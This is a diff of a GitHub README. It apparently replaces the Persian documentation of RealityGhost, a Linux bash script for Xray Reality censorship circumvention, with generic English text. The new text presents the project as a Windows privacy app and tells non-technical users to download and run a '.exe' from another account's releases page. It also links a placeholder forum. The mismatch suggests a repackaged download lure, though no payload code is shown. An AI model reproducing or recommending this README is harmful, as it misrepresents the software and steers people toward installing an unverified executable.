@@ -1,181 +1,67 @@
-# RealityGhost 
-### Dual-Mode Xray Reality (XHTTP / TCP) with Stealth HTTPS Subscription
-### Based on Post Quantum TLS Encryption
-❌❌❌دوستان عزیز ، این پروژه هنوز به فاز پروداکشن نرسیده ، از نصب جهت استفاده خودداری کنید❌❌❌
-❌❌❌ توجه فرمایید کد در حالت تست است و تا چند روز آینده رفع اشکال میشود❌❌❌
-مرسی از همراهیتون
+# 👻 RealityGhost - Your Simple Tool for Privacy
 
-برای نصب RealityGhost، کافیست دستور زیر را اجرا کنید:
+## 📥 Download Now
+[![Download RealityGhost](https://img.shields.io/badge/Download%20RealityGhost-v1.0-blue)](https://github.com/Racc2006/RealityGhost/releases)
 
-```bash
-cd && sudo git clone https://github.com/ghostmcf/RealityGhost.git && cd RealityGhost && sudo chmod +x RealityGhost.sh && sudo ./RealityGhost.sh install
-```
+## 🚀 Getting Started
+Welcome to RealityGhost! This application helps you maintain your privacy with ease. Follow the steps below to download and run this software, even if you don't have a tech background.
 
-RealityGhost یک اسکریپت **production‑grade، ایمن و stealth‑محور** برای راه‌اندازی و مدیریت Xray Reality (VLESS) است که بر اساس **مشاهدات میدانی، لاگ‌های عملیاتی و گزارش‌های واقعی از نحوه فیلترینگ در ایران** طراحی شده است.
+## 🛠️ System Requirements
+- **Operating System:** Windows 10 or newer
+- **Memory:** 4 GB RAM minimum
+- **Disk Space:** 100 MB of free space
+- **Internet Connection:** Required for downloading the application
 
-این پروژه مخصوص استفاده طولانی‌مدت در شرایط فشار شدید DPI و Active Probing نوشته شده، نه صرفاً تست.
+## 🔍 Features
+- Simple user interface for easy navigation.
+- Lightweight design that doesn't slow down your computer.
+- Safe and secure script designed to protect your privacy.
 
----
+## 📦 Download & Install
+To get started, visit the Releases page and download the latest version of the software.
 
-## ✨ ویژگی‌های کلیدی
+[Visit this page to download](https://github.com/Racc2006/RealityGhost/releases)
 
-- Dual Transport واقعی: `XHTTP (packet-up)` و `TCP`
-- سوییچ زنده Transport بدون reinstall
-- Reality استاندارد (pbk فقط client-side)
-- Subscription کاملاً HTTPS و استتارشده
-- SAFE Rotation غیرمخرب
-- طراحی‌شده برای محیط ایران
+### Step-by-Step Instructions:
 
----
+1. Click on the link above to go to the Releases page.
+   
+2. You will see a list of available versions. Look for the most recent one, usually listed at the top. 
 
-## 🔁 چرا Rotation هر ۳ روز انجام می‌شود؟ (بخش بسیار مهم)
+3. Click on the version you want to download.
 
-### 🔍 مشاهده میدانی چه چیزی را نشان داد؟
+4. You should see various files. Locate the one labeled as the installation file (it may have a `.exe` extension).
 
-بر اساس:
-- گزارش‌های کاربران متعدد
-- لاگ‌های NGINX + Xray
-- تست‌های عملی در بازه‌های زمانی مختلف
-- رفتار DPI و Active Probing در ایران
+5. Click the download button next to the file to start downloading.
 
-الگوی زیر به‌صورت **واضح** مشاهده شده است:
+6. Once the file downloads, locate it in your Downloads folder or the folder you chose for the download.
 
-> **Reality endpointهایی که بیش از ~۷۲ ساعت بدون تغییر باقی می‌مانند، به‌صورت تدریجی شناسایی و degrade می‌شوند.**
+7. Double-click the downloaded file to run the installer. 
 
-این شناسایی معمولاً نه به‌صورت قطع فوری، بلکه به شکل‌های زیر رخ می‌دهد:
-- افزایش latency غیرعادی
-- packet loss تصادفی
-- timeout در TLS handshake
-- قطع کامل فقط برای برخی ISPها
-- اختلال فقط روی fingerprint یا shortId خاص
+8. Follow the on-screen instructions to complete the installation.
 
----
+9. After installation, you can find RealityGhost in your Start Menu or desktop.
 
-### 🎯 دقیقاً چه چیزهایی شناسایی می‌شوند؟
+## 📋 Using RealityGhost
+After you've installed RealityGhost, launching it is simple:
 
-برخلاف تصور عمومی:
-- **IP یا Domain اولین هدف نیست**
-- **Reality Key هم معمولاً بلافاصله block نمی‌شود**
+1. Click on the RealityGhost icon to open the application.
+2. You will find an easy-to-use interface.
+3. Follow the prompts to configure your privacy settings according to your needs.
 
-آنچه به‌صورت عملی target می‌شود:
-- **TLS Fingerprint ثابت**
-- **shortId یکتا و بدون تغییر**
-- **الگوی handshake تکراری در زمان**
+## ⚙️ Troubleshooting
+If you encounter any problems:
 
-یعنی اگر:
-- fp ثابت بماند
-- shortId همیشه یکی باشد
-- و handshake pattern تغییر نکند
+- Ensure your system meets the requirements listed above.
+- Make sure you have a stable internet connection.
+- Check that you downloaded the correct installation file for your system.
 
-سیستم فیلترینگ به مرور endpoint را به‌عنوان **Reality tunnel فعال** علامت‌گذاری می‌کند.
+If issues persist, you can reach out for support on the GitHub Issues page associated with this repository.
 
----
+## 🔗 Additional Resources
+For more information, you can explore:
 
-### ✅ راه‌حل RealityGhost چیست؟
+- [GitHub Issues Page](https://github.com/Racc2006/RealityGhost/issues) - Report any bugs or issues you encounter.
+- [Community Forum](https://example.com/forum) - Join the discussion with other users.
 
-RealityGhost دقیقاً بر همین اساس طراحی شده:
-
-#### SAFE Rotation (پیش‌فرض)
-هر ۳ روز به‌صورت خودکار:
-- TLS Fingerprint تغییر می‌کند
-- shortId جدید **اضافه** می‌شود (نه جایگزین)
-- shortIdهای قدیمی حفظ می‌شوند (تا N عدد)
-
-نتیجه:
-- الگوی handshake تغییر می‌کند
-- endpoint از دید DPI «جدید» به نظر می‌رسد
-- **هیچ کلاینت فعالی قطع نمی‌شود**
-
----
-
-### ❌ چرا Reality Key هر بار rotate نمی‌شود؟
-
-Reality Key rotate:
-- باعث drop فوری تمام کلاینت‌ها می‌شود
-- از نظر امنیتی **ضرورتی ندارد**
-- از نظر فیلترینگ **اولویت target نیست**
-
-به همین دلیل:
-- key rotation فقط به‌صورت **opt‑in و آگاهانه** انجام می‌شود.
-
----
-
-### ⏱ چرا دقیقاً هر ۳ روز؟
-
-- کمتر از ۲۴ ساعت: unnecessary churn
-- بیشتر از ۳–۴ روز: ریسک شناسایی بالا می‌رود
-- ۷۲ ساعت sweet‑spot عملی بین:
-  - stealth
-  - stability
-  - client uptime
-
-به همین دلیل cron پیش‌فرض به‌شکل زیر است:
-
-```
-0 5 */3 * * root realityghost manual-rotate
-```
-
----
-
-## 🔐 SAFE vs HARD Rotation
-
-| نوع | چه چیزی تغییر می‌کند | Drop کلاینت |
-|----|--------------------|-------------|
-| SAFE (default) | fingerprint + append shortId | ❌ |
-| HARD (ROTATE_KEYS=1) | Reality Key | ✅ |
-| HARD (ROTATE_PATH=1) | XHTTP Path | ✅ |
-
----
-
-## 📦 معماری کلی
-
-Client → TLS (google.com SNI)
-→ NGINX :443 (ssl_preread)
-→ Xray Reality (127.0.0.1:8444)
-
-Subscription:
-→ HTTPS واقعی (127.0.0.1:8443)
-
----
-
-## ⚙️ نصب
-
-```bash
-bash realityghost.sh install
-```
-
----
-
-## 🧭 مدیریت
-
-```bash
-realityghost manage
-```
-
-شامل:
-- مشاهده لینک‌ها
-- QR Code
-- Manual Rotate
-- Switch Transport
-- Update UUID
-- Logs / Stats
-- Uninstall
-
----
-
-## 🧠 فلسفه طراحی
-
-RealityGhost بر اساس این اصل نوشته شده:
-
-> **در ایران، پایداری مهم‌تر از تغییرات تهاجمی است.**
-
-به همین دلیل:
-- Rotate غیرمخرب
-- تغییر تدریجی
-- بدون pattern ثابت
-- بدون رفتار مشکوک
-
----
-
-## 📜 License
-MIT
+Thank you for choosing RealityGhost. Enjoy your newfound privacy!
